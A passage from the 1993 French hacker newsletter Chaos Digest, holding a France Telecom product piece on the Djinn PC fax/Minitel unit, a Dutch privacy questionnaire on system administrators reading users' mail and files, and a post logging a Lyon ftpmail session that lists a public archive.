Djinn comes in a pocket format box (95 x 60 mm) and features extremely
simple software which takes full advantage of the flexibility of the
Windows user interface.  The solution is based on the use of an
external unit -- linked to the PC via the telephone network -- and an
innovative telecommunications application.  The application is
designed around the "telephone directory/ agenda", which manages the
different features.

Djinn users must be equipped with a telephone and a PC with Windows
(minimum configuration 386SX/20 MHz, 4 Mb RAM, 60 Mb hard disk, VGA
screen, DOS v5.0 and Windows v3.1).


Djinn features:

     DIRECTORY-AGENDA: UNIFIED PERFORMANCE

     The directory-agenda is a powerful "personal organizer" which
groups full information on individuals (telephone, fax numbers).  The
user simply clicks on the name of an individual to directly dial the
number and speak with the party to discuss a document on the screen
and then fax it, for example.

The directory-agenda also has an automatic calling feature and enables
access to services via the Teletel videotex hosts.

     ON-SCREEN TELEPHONE

     On-screen telephone use is simple and efficient.  Dedicated icons
enable automation of features such as appointment reminders, directory
assistance or optional services like call forwarding, three-way
conferencing, or call waiting.

     FAX TRANSMISSION HAS NEVER BEEN EASIER

     With the "quick fax" feature, a text editor is used to add a
message to a personalized header page and send it immediately.  The
fax selector function enables a document to be faxed from any Windows
application (word processor, spreadsheet, graphics, etc.) as easily as
launching a print job, with or without a cover page.

If the PC is connected to a scanner, documents not on the computer can
also be scanned and faxed.

Fax reception is active whenever the PC is on.  The user is notified
that a fax has arrived and can then check the fax reception status
log.

     ANSWERING MACHINE FUNCTION

     The PC also becomes an answering machine with Djinn, since the
integrated microphone allows recording of several different messages.
Messages left by callers are digitized and stored on the hard disk
(the computer must of course be left on to activate this feature).

     THE MARRIAGE OF MINITEL AND WINDOWS

     Djinn enables access to all Teletel videotex hosts, along, with
four streamlined adaptations for easy use of the railway and airline
timetable services, telephone directory assistance and Minicom
services.  All four services are transformed into full-fledged
applications.  For example, all information requests are grouped on
one or two screen pages.  For a train reservation on French national
railways (SNCF), for example, the screen shows the destination, date
and times, smoking/no-smoking seat selection, etc.  database
information requests are executed as background tasks, keeping the
computer free to run other applications.

Djinn also integrates the Teletel High Speed photo mode (4,800 baud).

     ONLINE USER SUPPORT

     A user support server provides downloading of software updates or
dedicated adaptation of server applications.  Djinn includes automatic
"click" access to the user support server.

Promotional campaign:

Market launch of Djinn will be supported by an advertising campaign
signed by France telecom in partnership with IBM.  The theme of the
campaign is: "When your PC becomes a fax, Minitel and answering
machine, it's not magic, it's Djinn" [Quand votre micro devient fax,
Minitel, repondeur... ce n'est pas sorcier, c'est Djinn].

The campaign kicked off on June 10th and will be run in computer and
business trades, as well as in spezialized sector trades such as
medical, hotel of construction industry publications.


Djinn development parteners:

     COM1

     Founded in 1987, COM1 is specialized in the design and
development of telecommunications products.  The European leader in
the modem market, COM1 has manufactured nearly 300,000 modems.  In
1992 the company had sales of FRF90 million and sold over 100,000
modems.

COM1 is centered on its powerful R&D department.  Manufacturing
operations are carried out in partnership with Slectron.
Bordeaux-based Selectron is an affiliate of one the United States'
leading specialists in high integration electronics contract work.
Other manufacturing partners are Cotee (Merignac) and Sofrel (Angers).

France Telecom acquired an equity stake in COM1 in 1990 via its
Innovacom subsidiary.  AT&T Paradyne recently signed a technical and
marketing agreement with COM1 giving the company exclusive
distribution rights for its PCMCIA high-speed radio transmission
products (V32 and V32bis) for the EC, the former Soviet Union, Africa
and the Middle East.

Among the major accounts for which COM1 works are IBM France (and four
of its European subsidiaries), Toshiba, Apple and Hewlett-Packard USA.

     INTEGRO

     Founded in 1981, Integro is a French company with a number of
foreign affiliates (including subsidiaries in the United States and
the UK).  The company generates a significant percentage of its sales
-- which rose from FRF10 million to FRF60 million between 1988 and
1992 -- in export markets.  Integro currently has a work force of 100
persons, half of them involved in research and development.

Integro software products are designed to serve two areas of needs:

   * Progressive evolution from centralized to distributed information
     processing, enabling communications between workstations with these
     two different types of architecture;

   * creation of client-server architectures to guarantee total consistency
     between existing IT resources and focused on department and cooperative
     type computing solutions.

------------------------------

End of Chaos Digest #1.57
************************************

Chaos Digest             Dimanche 20 Juin 1993        Volume 1 : Numero 58
                            ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.58 (20 Juin 1993)
File 1--L'informatique est-elle une affaire privee? (questionnaire)
File 2--Curieux FTPMail francais (flicage)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Thu Jun 10 04:49:00 EDT 1993
From: maas@dutiws.TWI.TUDelft.NL (Franck Maas )
Subject: File 1--L'informatique est-elle une affaire privee? (questionnaire)


Dear reader,

You are now reading the introduction to the "Privacy and Computers"-
questionnaire. This questionnaire is meant to get an idea of what is
generally considered as being appropriate for a system-manager with
respect to privacy. That 'idea' will be described in a short report,
that will be made available to the public (see below).
Three means of distribution are chosen for this questionnaire: the
authors will send it to known people by E-mail, it will be posted
in several newsgroups and it is available by anonymous ftp. See
below for more details.

Everyone who works with a computersystem is invited to send in
his/her response. You are encouraged to distribute the questionnaire
to friends and colleagues. The more reactions the better!

The authors prefer that you send your response by E-mail (see below).
You can rely on their confidentiality. Headers are stripped of immedia-
tely after receiving of the messages. However, if you don't like the idea
of sending your responses by E-mail, you can also choose to return the
form by Snail-mail (normal mail). In short:

       * E-mail to maas@dutiws.twi.tudelft.nl
                or holland@dutiws.twi.tudelft.nl
                (your mailheaders will be removed)

       * send it by Snail-mail to
           P&C Questionnaire
           PO Box 9512
           1006 GA Amsterdam
           The Netherlands

Please respond before June 27.

Thanks in advance for your effort,

Gerhard den Hollander,
Frank Maas

-----------------------------
AVAILABILITY of Questionnaire
-----------------------------

*      some people receive this questionnaire by E-mail
*      the questionnaire can be found in newsgroups alt.security,
       alt.hackers. alt.privacy, comp.unix.misc, comp.security.
*      until June 26th it will be available by anonymous ftp, on
       dutiws.twi.tudelft.nl [130.161.159.11], as /pub/privquest/quest

HOW TO FILL IN THIS QUESTIONAIRE?

Below you'll find questions which are preceded by the character 'Q' and
a question number. If appropriate, you'll find below the question the
possible answer options (preceeded by 'O' + question number). In any
case, the last line will be an 'A' and the question number. Here you'll
find the type of answer that is expected and you can fill in your
answer.
If you are replying by E-mail, it would be a great help if you delete
the question- and option-texts (also those which you didn't answer)
before returning your answers.

ANSWER FORMAT

'...'      means an open answer (type as much as you want)
'[.]'      means a closed answer (type only the option)
'[.|.|.]'  means a closed answer (type all applicable options)

E-mail repliers: don't bother filling in exactly between the '[]'-s,
just type your answer behind the format.

___o/_______________________________________________________________________
   O\   CUT HERE

GENERAL QUESTIONS

The questions about your personal situation are for pure statistical
reasons only. If you prefer not to answer them, don't.

Q.G1   In which country/state do you live?
A.G1   ...

Q.G2   What is your age/Date of Birth?
A.G2   ...

Q.G3   What is your gender?
O.G3   (F) Female        (M)  Male
A.G3   [.]

Q.G4   What is your highest education?
O.G4   Choose equivalent:
       (N) None          (P)  Primary School      (H)  High School
       (U) University    (O)  Other (please specify)
A.G4   [.] ...

Q.G5   What is your education level applied to computer science?
O.G5   Choose equivalent:
       (N) None          (P)  Primary School      (H)  High School
       (U) University    (O)  Other (please specify)
A.G5   [.] ...

Q.G6   Are you employed in the computer science?
O.G6   (Y) Yes           (N)  No
A.G6   [.]

Q.G7   Are you a ... ?
O.G7   (S) System manager     (N)  News manager   (P)  Postmaster
       (U) User               (O)  Other manager (please specify)
A.G7   [.|.|.|.] ...

Q.G8   Where did you get this questionnaire?
O.G8   (A) Directly from authors      (S) From my system manager
       (N) From News (specify group)  (M) Somebody mailed it to me
       (F) FTP from dutiws...       (O) Other (please specify)
A.G8   [.] ...
------------------------------------------------------------------------
MAIL

Q.M1   Should reading of someone else's E-mail be regarded as an
       infringement of the privacy?
O.M1   (Y) Yes                (N)  No
       (A) Almost always      (S)  Sometimes
A.M1   [.]

System Managers and Postmasters are invited to go to question Q.M6

Q.M2   Does your System Manager/Postmaster read the mail of users?
O.M2   Choose one of these:
       (Y) Yes           (N)  No             (I)  I don't know
       and one of these:
       (O) Everybody knows officially   (U)  Some know unofficially
       (N) Nobody knows
A.M2   [.][.]

Q.M3   Under which circumstances do you find it justified that a System
       Manager/Postmaster reads the mail of users?
O.M3   (P) Mail problems                (S)  Security problems
       (O) Other (please specify)       (N)  Never
A.M3   [.|.|.] ...

Q.M4   Did you reply on these questions for ... ?
O.M4   (I) Incoming messages       (O)  Outgoing messages   (B) Both
A.M4   [.]

Please go to the NEWS paragraph if you replied 'Both'.

Q.M5   Please describe the difference between monitoring Incomming and
       Outgoing messages.
A.M5   ...

Please go to the NEWS paragraph

Q.M6   Do you read your users' mail?
O.M6   (Y) Yes           (N)  No                  (S)  Sometimes
A.M6   [.]

If you replied 'No', please go to the NEWS paragraph

Q.M7   Why and when do you read your users' mail?
O.M7   Choose one of the following:
       (A) Always        (S)  Security reasons         (M) Mailproblems
       (O) Other
       and specify your reasons into detail
A.M7   [.|.|.|.] ...

Q.M8   Do your users know that?
O.M8   (P) Yes, it is a well known Policy
       (S) Some users know this policy
       (U) Some of them do, unofficially     (N)  No
A.M8   [.]
------------------------------------------------------------------------
NEWS

If your system does not have News, you might want to go directly to
the next paragraph. However, you are invited to reply to the first set
of questions.

Q.N1   Is the System Manager/News Manager allowed to censor news
       articles?
O.N1   Choose one of the following:
       (I) Yes, (s)he can censor incoming articles
       (O) Yes, (s)he can censor outgoing articles
       (B) Yes, (s)he can censor both incoming and outgoing articles
       (N) No
       and (if not 'No') explain when
A.N1   [.] ...

(Note: the question is not if a SM/NM may read those articles, since
they are freely accessible)

Q.N2   Is the System Manager/News Manager allowed to forbid newsgroups?
O.N2   (Y) Yes (explain when and why)   (N) No
A.N2   [.] ...

The following questions ask for a bit of explanation. Each user that
reads news has a file in his/her directory, describing the active
newsgroups read by that user. Normally this file is only consulted by
the newsreader, however some news-administration tools read all of those
files on a system.

Q.N3   Should reading of those files be regarded as an infringement of the
       privacy?
O.N3   (Y) Yes                 (N)  No
       (A) Almost always       (S) Sometimes
A.N3   [.]

If your system has no News, please go to the FILES paragraph

System Managers (of systems with News) and News Managers, are invited to
go to question Q.N6

Q.N4   Does your System Manager/News Manager read those files?
O.N4   Choose one of these:
       (Y) Yes           (N)  No             (I)  I don't know
       and one of these:
       (O) Everybody knows officially   (U)  Some know unofficially
       (N) Nobody knows
A.N4   [.][.]

Q.N5   Under which circumstances you find it justified that a System
       Manager/News Manager reads those files?
O.N5   (P) Newsproblems            (S)  Security problems   (N) Never
       (T) Statistical reasons     (O)  Other (please specify)
A.N5   [.|.|.|.] ...

Please go to the FILES paragraph

Q.N6   Do you read your users' news files?
O.N6   (Y) Yes           (N)  No             (S)  Sometimes
A.N6   [.]

If you replied 'No', please go to Q.N9

Q.N7   Why and when do you read your users' newsfiles?
O.N7   Choose one of the following:
       (A) Always                  (S)  Security reasons    (O) Other
       (T) Statistical reasons     (N)  Newsproblems
       and specify your reasons into detail
A.N7   [.|.|.|.] ...

Q.N8   Do your users know that?
O.N8   (P) Yes, it is a well known Policy
       (S) Some users know this policy
       (U) Some of them do, unofficially
       (N)  No
A.N8   [.]

Q.N9   Do you censor articles?
O.N9   (I) Yes, Incoming articles            (O)  Yes, Outgoing articles
       (B) Yes, both incoming and outgoing   (N)  No
A.N9   [.]

Q.N10  Do your users know that?
O.N10  (P) Yes, it is a well known Policy
       (S) Some users know this policy
       (U) Some of them do, unofficially
       (N)  No
A.N10  [.]

Q.N11  Do you forbid some newsgroups?
O.N11  (Y) Yes (explain when and why)   (N)  No
A.N11  [.] ...

Q.N12  Do your users know that?
O.N12  (P) Yes, it is a well known Policy
       (S) Some users know this policy
       (U) Some of them do, unofficially
       (N)  No
A.N12  [.]
------------------------------------------------------------------------
FILES

Q.F1   Should browsing through and viewing of someone else's files be
       regarded as an infringement of the privacy?
O.F1   (Y) Yes                 (N)  No
       (A) Almost always       (S)  Sometimes
A.F1   [.]

System Managers can go directly to Q.F6

Q.F2   Does your System Manager browse through/view user files?
O.F2   Choose one of these:
       (Y) Yes           (N)  No             (I)  I don't know
       and one of these:
       (O) Everybody knows officially   (U)  Some know unofficially
       (N) Nobody knows
A.F2   [.][.]

Q.F3   Under which circumstances do you find it justified that a System
       Manager browses through/views user files?
O.F3   (P) System problems (specify)    (S)  Security problems
       (O) Other (please specify)       (N)  Never
A.F3   [.|.|.] ...

Q.F4   Does your System Manager delete user files?
O.F4   Choose one of these:
       (Y) Yes           (N)  No             (I)  I don't know
       and one of these:
       (O) Everybody knows officially   (U)  Some know unofficially
       (N) Nobody knows
A.F4   [.][.]

Q.F5   Under which circumstances do you find it justified that a System
       Manager deletes user files?
O.F5   (P) System problems (specify)    (S)  Security problems
       (O) Other (please specify)       (N)  Never
A.F5   [.|.|.] ...

Please go to the USER MONITORING paragraph

Q.F6   Do you browse through/view your users' files?
O.F6   (Y) Yes           (N)  No                  (S)  Sometimes
A.F6   [.]

If you replied 'No', please go to Q.F9

Q.F7   Why and when do you browse through/view your users' files?
O.F7   Choose one of the following:
       (A) Always             (S)  Security reasons
       (P) System Problems    (O)  Other
       and specify your reasons into detail
A.F7   [.|.|.|.] ...

Q.F8   Do your users know that?
O.F8   (P) Yes, it is a well known Policy
       (S) Some users know this policy
       (U) Some of them do, unofficially     (N)  No
A.F8   [.]

Q.F9   Do you delete users' files?
O.F9   (Y) Yes           (N)  No                  (S)  Sometimes
A.F9   [.]

If you replied 'No', please go to the USER MONITORING paragraph

Q.F10  Why and when do you delete users' files
O.F10  Choose one of the following:
       (S)  Security reasons
       (P) System Problems    (O)  Other
       and specify your reasons into detail
A.F10  [.|.|.] ...

Q.F11  Do your users know that?
O.F11  (P) Yes, it is a well known Policy
       (S) Some users know this policy
       (U) Some of them do, unofficially     (N)  No
A.F11  [.]
-----------------------------------------------------------------------
USER MONITORING

For the following questions, again a little explanation is necessary.
The system manager can, by means of tools, or just by examining the system
on a regular base, monitor user actions. That is, (s)he can trace user
actions. This can range from watching which programs are run to monitoring
the keystrokes typed in.

Q.U1   Do you regard such user monitoring an infringement of the privacy
O.U1   (Y) Yes               (N)  No
       (A) Almost always     (S)  Sometimes
A.U1   [.]

If you are a System Manager, please go to Q.U4

Q.U2   Does your System Manager monitor user actions
O.U2   Choose one of these:
       (Y) Yes           (N)  No             (I)  I don't know
       and one of these:
       (O) Everybody knows officially   (U)  Some know unofficially
       (N) Nobody knows
A.U2   [.][.]

Q.U3   Under which circumstances do you find it justified that a System
       Manager monitors user actions?
O.U3   (P) System problems (specify)    (S)  Security problems
       (O) Other (please specify)       (N)  Never
A.U3   [.|.|.] ...

Go to the INFORMATION TO EXTERIOR paragraph

Q.U4   Do you monitor your users' actions?
O.U4   (Y) Yes           (N)  No                  (S)  Sometimes
A.U4   [.]

If you replied 'No', please go to the INFORMATION TO EXTERIOR paragraph

Q.U5   Why and when do you monitor your users' actions?
O.U5   Choose one of the following:
       (A) Always             (S)  Security reasons
       (P) System Problems    (O)  Other
       and specify your reasons into detail
A.U5   [.|.|.|.] ...

Q.U6   Do your users know that?
O.U6   (P) Yes, it is a well known Policy
       (S) Some users know this policy
       (U) Some of them do, unofficially     (N)  No
A.U6   [.]

INFORMATION TO EXTERIOR

Q.I1   Do you have access to TCP/IP services (ftp,telnet,etc.) outside your
       local network?
O.I1   (Y) Yes           (N)  No
A.I1   [.]

If you replied 'No' then you can go to the CLOSING section. Still, you
are invited to reply to the next questions, since they are of a general
nature.

Again an explanation for the following questions. If you make a TCP/IP
connection to another host (eg. if you rlogin to another host), that host
can retrieve your original host ID. However, your identity is not known.
A tool (pidentd) exists which enables the remote machine to retrieve your
username.

For the following questions, the running of this tool (and thus the
providing of the information) is important. The use of that informati-
on by the remote host lies beside the scope of this questionnaire.

Q.I2   Is providing of this information an infringement of the privacy?
O.I2   (Y) Yes              (N)  No
       (A) Almost always    (S)  Sometimes
A.I2   [.]

Q.I3   Should the users be informed if their systems provide this
       information?
O.I3   (Y) Yes           (N)  No
A.I3   [.]

If you are a System Manager, please go to Q.I5

Q.I4   Does your system provide this information?
O.I4   Choose one of these:
       (Y) Yes           (N)  No             (I)  I don't know
       and one of these:
       (O) Everybody knows officially   (U)  Some know unofficially
       (N) Nobody knows
A.I4   [.][.]

Go to the CLOSING paragraph

Q.I5   Does your system provide this information?
O.I5   (Y) Yes           (N)  No
A.I5   [.]

If you replied 'No' please go to the CLOSING paragraph

Q.I6   Do your users know you provide this information?
O.I6   (P) Yes, it is a well known Policy
       (S) Some users know this policy
       (U) Some of them do, unofficially     (N)  No
A.I6   [.]

-----------------------------------------------------------------------
CLOSING

Q.C1   Do you like to receive the results of this questionnaire?
O.C1   (E) Yes, by E-mail (specify your E-mail address)
       (S) Yes, by Snail-mail (specify your address; letter will be send
           on RPP (Receiver Pays Postage) base
       (G) Yes, post it in a newsgroup (specify which group; the
           results will be posted if at least 20 requests are received)
       (N) No
A.C1   [.] ...

Q.C2   Does your company has a policy for Computers and Privacy? If so,
       could you summarize it here?
A.C2   ...

Q.C3   If you have any comments, things to add, other observations, etc.
       please note them here.
A.C3   ...

------------------------------

Date: Thu Jun 10 12:17:26 GMT 1993
From: hbinda@ensem.u-nancy.fr (Herve BINDA )
Subject: File 2--Curieux FTPMail francais (flicage)


Les FTP Mail sont des systemes forts interessants afin d'obtenir des
fichiers directement par une simple adresse electronique. Outre le tres
classique ftpmail@decwrl.dec.com, nous avons teste pour vous le dernier
FTP Mail lyonnais a la mode. Voici les trois messages recus:

     (1) CONFIRMATION DE MA REQUETE

Date: Thu May 27 14:12:08 +0200 1993
From: internet!grasp1.univ-lyon1.fr!ftpmail-request
Message-Service: mail
Received: from internet by attmail; Thu May 27 12:24 GMT 1993
Received: by att.att.com; Thu May 27 07:59:18 EDT 1993
Received: by grasp1.univ-lyon1.fr (5.67a8/IDA-1.5f)
  via Rocad id AA17912; Thu, 27 May 1993 14:12:08 +0200
MTS-Message-ID: 
UA-Content-ID: 
Subject:  response
UA-Message-ID: 
To: !jbcondat
Message-Id: <199305271212.AA17912@grasp1.univ-lyon1.fr>
Content-Type: text
Content-Length: 1644

 response
==> First check the local archive for the files you are
==> requesting.  We will no longer tolerate those requesting
==> files shadowed locally from remote sites.

* Toutes les transactions sont journalisees. En cas de problemes de
* securite, de transferts illegaux impliquant ce service, nous mettrons
* les journaux a la disposition des demandeurs (administrateurs de
* sites distants, CERT, justice, police, ...).
* Si cette politique ne vous convient pas, n'utilisez pas ce service.

* All transfers are logged. In case of security problems, illegal file
* transfers done with this service, we'll make the logs available to
* the requestors (site administrators, CERT, justice, police, ...).
* If you dislike this policy, don't use this service.
                                                      << Commentaire 1 >>

ftpmail has received the following job from you:
      reply-to jbcondat@attmail.com
      open ftp.eff.org anonymous ftpmail/jbcondat@attmail.com
      cd /pub/cud/chaos
      dir

ftpmail has queued your job as: 504727.19959
There are 15 jobs ahead of this one in the queue.

To remove send a message to ftpmail@grasp1.univ-lyon1.fr containing just:
delete 504727.19959


Your original input was>>
Received: from att.att.com by grasp1.univ-lyon1.fr (5.67a8/IDA-1.5f)
  via Rocad with SMTP id AA17139; Thu, 27 May 1993 14:12:05 +0200
Message-Id: <199305271212.AA17139@grasp1.univ-lyon1.fr>
From: jbcondat@attmail.com
Date: 31 Dec 69 23:59:59 GMT                          << Commentaire 2 >>
To: ftpmail@grasp.insa-lyon.fr
Received: from jbcondat by attmail; Thu May 27 12:05:09 GMT 1993
Subject: _Chaos Digest_
Content-Type: text
X-Charset: ASCII
X-Char-Esc: 29

connect ftp.eff.org
chdir /pub/cud/chaos
dir
quit


     (2) RESULTAT DE LA REQUETE

Date: Thu May 27 14:45:08 +0200 1993
From: internet!grasp1.univ-lyon1.fr!ftpmail-request
Message-Service: mail
Received: from internet by attmail; Thu May 27 12:44 GMT 1993
Received: by att.att.com; Thu May 27 08:32:21 EDT 1993
Received: by grasp1.univ-lyon1.fr (5.67a8/IDA-1.5f)
  via Rocad id AA18309; Thu, 27 May 1993 14:45:08 +0200
MTS-Message-ID: 
UA-Content-ID: 
Subject: ftp.eff.org:/pub/cud/chaos (dir )
UA-Message-ID: 
To: !jbcondat
Message-Id: <199305271245.AA18309@grasp1.univ-lyon1.fr>
Content-Type: text
Content-Length: 2091

total 1764
-rw-r--r--  1 brendan  149         28250 Feb 10 01:56 chaos-1.01
-rw-r--r--  1 brendan  149         28902 Feb 10 01:55 chaos-1.02
-rw-r--r--  1 brendan  149         27167 Jan 15 22:16 chaos-1.03
-rw-r--r--  1 brendan  149         28736 Feb 10 01:55 chaos-1.04
-rw-r--r--  1 brendan  149         24831 Feb 22 22:46 chaos-1.05
-rw-r--r--  1 brendan  149         29104 Feb 10 01:55 chaos-1.06
-rw-r--r--  1 brendan  149         26985 Feb 10 01:56 chaos-1.07
-rw-r--r--  1 brendan  149         26968 Feb 22 22:46 chaos-1.08
-rw-r--r--  1 brendan  149         29406 Feb 22 22:46 chaos-1.09
-rw-r--r--  1 brendan  149         28711 Feb 22 23:39 chaos-1.10
-rw-r--r--  1 brendan  149         28641 Feb 24 08:10 chaos-1.11
-rw-r--r--  1 brendan  149         28591 May  3 22:28 chaos-1.12
-rw-r--r--  1 brendan  149         27285 Mar 31 18:03 chaos-1.13
-rw-r--r--  1 brendan  149         29628 Apr 14 23:37 chaos-1.14
-rw-r--r--  1 brendan  149         29840 Apr 14 23:37 chaos-1.15
-rw-r--r--  1 brendan  149         29381 Apr 17 02:23 chaos-1.16
-rw-r--r--  1 brendan  149         28501 May  3 22:28 chaos-1.17
-rw-r--r--  1 brendan  149         27374 May  3 22:28 chaos-1.18
-rw-r--r--  1 brendan  149         26277 May  3 22:28 chaos-1.19
-rw-r--r--  1 brendan  149         27565 May  3 22:28 chaos-1.20
-rw-r--r--  1 brendan  149         25878 May  3 22:28 chaos-1.21
-rw-r--r--  1 brendan  149         28757 May  3 22:28 chaos-1.22
-rw-r--r--  1 brendan  149         27588 May 12 23:46 chaos-1.23
-rw-r--r--  1 brendan  149         27631 May 17 21:12 chaos-1.24
-rw-r--r--  1 brendan  149         24288 May 17 21:12 chaos-1.25
-rw-r--r--  1 brendan  149         28150 May 18 17:53 chaos-1.26
-rw-r--r--  1 brendan  149         26875 May 21 00:35 chaos-1.27
-rw-r--r--  1 brendan  149         27857 May 21 00:35 chaos-1.28
-rw-r--r--  1 brendan  149         26262 May 21 15:26 chaos-1.29
-rw-r--r--  1 brendan  149         27863 May 21 15:27 chaos-1.30
-rw-r--r--  1 brendan  149         27497 May 21 15:27 chaos-1.31
-rw-r--r--  1 brendan  149         26979 May 21 15:27 chaos-1.32
                                                      << Commentaire 3 >>

     (3) CONFIRMATION D'ENVOI

Date: Thu May 27 14:45:17 +0200 1993
From: internet!grasp1.univ-lyon1.fr!ftpmail-request
Message-Service: mail
Received: from internet by attmail; Thu May 27 12:49 GMT 1993
Received: by att.att.com; Thu May 27 08:32:24 EDT 1993
Received: by grasp1.univ-lyon1.fr (5.67a8/IDA-1.5f)
  via Rocad id AA18310; Thu, 27 May 1993 14:45:17 +0200
MTS-Message-ID: 
UA-Content-ID: 
Subject: ftpmail job completed
UA-Message-ID: 
To: !jbcondat
Message-Id: <199305271245.AA18310@grasp1.univ-lyon1.fr>
Content-Type: text
Content-Length: 1063

 response

Your job was (lines begining DONE show completed transfers):
      reply-to jbcondat@attmail.com
      open ftp.eff.org anonymous ftpmail/jbcondat@attmail.com
      cd /pub/cud/chaos
 DONE dir

The ftp log contains:
Connecting to ftp.eff.org
 220 kragar.eff.org FTP server (Version 2.0WU(10) Thu Apr 8 17:46:21 EDT 1993)
ready.
 ---> USER anonymous
 331 Guest login ok, send your complete e-mail address as password.
 ---> PASS 
 230-If your ftp client chokes on this message, log in with a '-' as the
 230-first character of your password to disable it.
 230 Guest login ok, access restrictions apply.
 ---> PWD
 257 "/" is current directory.
 ---> TYPE I
 200 Type set to I.
 ---> CWD /pub/cud/chaos
 250 CWD command successful.
 ---> PWD
 257 "/pub/cud/chaos" is current directory.
 ---> TYPE A
 200 Type set to A.
 ---> PORT 134,214,100,25,10,216
 200 PORT command successful.
 ---> LIST
 150 Opening ASCII mode data connection for /bin/ls.
 226 Transfer complete.
 ---> TYPE I
 200 Type set to I.
 ---> QUIT
 221 Goodbye.
                                                      << Commentaire 4 >>

[ChaosD: La perspective de ce FTP Mail lyonnais nous semblait interessante,
sachant que nous habitons a moins de 2 km du site questionne. Mais plusieurs
constatations nous sont venus a l'esprit:

* Que signifient les commentaires etonnants en francais/anglais, citant meme
  le CERT (!), la justice, la police et un superbe "..." devant un tel
  service?  D'apres nos sources, ces commentaires viendraient de Christophe
  Wolfhugel ou de Herve Schauer, grands "gourous" en la matiere.

* Pourquoi le systeme a bien accepter l'heure incroyable de mon horloge qu'
  AT&T se fait un malin plaisir de ne pas regler (temps Unix - 1)?

* Le transfert est superbe, mais le repertoire est en retard de plusieurs
  numeros au jour de l'interrogation!

* Enfin, devant un transfert realise en moins de huit minutes, nous restons
  satisfaits... sauf que notre serveur lyonnais refuse de servir mon adresse
  AT&T pourtant bien lyonnaise et me retourne desormais une clause de non
  recevoir definitive.

Alors, en exercice, je vous suggere de tester bitftp@pucc.princeton.edu ou
mieux, le BITFTP@vm.gmd.de. Ils sont tous les deux aussi racistes sur les
lyonnais utilisant AT&T.]

                   ```
                  (o o)
+-------------oOO--(_)--OOo---------------------------------------------+
|                       Herve Binda                                     |
|     Ecole Nationale Superieure d'Electricite et de Mecanique          |
|                 2 eme Annee ( filiere ISA )                           |
+-----------------------------------------------------------------------+
| permanent email            hbinda@ensem.u-nancy.fr                    |
| temporarly email           hebinda@nyx.cs.du.edu                      |
| on IRC : CORWYN                                                       |
| on MUDs : can't tell you   8-)                                        |
+-----------------------------------------------------------------------+

------------------------------

End of Chaos Digest #1.58
************************************

Chaos Digest              Mardi 22 Juin 1993        Volume 1 : Numero 59
                            ISSN 1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.59 (22 Juin 1993)
File 1--40H VMag Number 7 Volume 2 Issue 3 #000-003(1) (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Number 7 Volume 2 Issue 3 #000-003(1) (reprint)


40Hex Number 7 Volume 2 Issue 3                                   File 000

